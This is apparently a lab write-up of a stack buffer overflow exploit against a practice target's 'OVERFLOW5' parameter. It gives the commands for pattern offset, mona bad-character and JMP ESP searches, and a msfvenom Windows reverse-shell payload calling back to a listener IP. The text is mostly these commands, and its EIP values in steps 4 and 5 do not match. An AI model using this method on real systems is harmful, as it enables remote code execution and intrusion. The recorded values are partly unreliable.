We have the exploit  and we already know the vulnrable parameter...


We just need to do some of the following steps to exploit this module...


1. Find crash byte on vulnrable parameter 'OVERFLOW5 '

2. When program crash Note the valu of crah byte in our case 500

3. Now we have the crash byte but we need exact cash point where program crashed
   To do that we have to create a hex pattern with msf which is located in kali
      /usr/bin/msf-pattern_create -l 500 

4. After sending the payload we need to find the eip after crash in this exploit		346B4134  Note it.

5. Now we need to get offset value which is exact value where program crashed...
      /usr/bin/msf-pattern_offset -l 500  -q 356B4134

6. Then find the bad char to do that we have to use mona to create working directry first then we have to define a array with help of mona again !mona -bytearry '\x00'

7. Copy the array where we set directory and save as badchar in program

8. Varify the badchar by using mona if exist do the same step again !mona bytearray -b '\x00\x16\x2f\xf4\xfd'  these are bad char we found. and again create a array with help of imnt-dbg.

9. When we varify there is no bad char find out jump esp to do that we've to use !mona modules to check which module is vulnrable when we see FALSE in every coloumn that mean program is vulnrable

10. Now lets find out the jmpesp address  !mona find -s "\xff\xe4" -m essfunc.dll      by this command essfunc.dll is vulnrable in our case.

11. This will retun module address copy it and wrint in little endian form because that how program execute .

#jump esp location = 625011af
#jumpesp="\xaf\x11\x50\x62"



12. We are ready to genrate the shell code except badchar..
    msfvenom -p windows/shell_reverse_tcp LHOST=10.8.5.14 LPORT=1234 -b '\x00\x16\x2f\xf4\xfd' -f c

execute it before start listner .....

we got the shell....
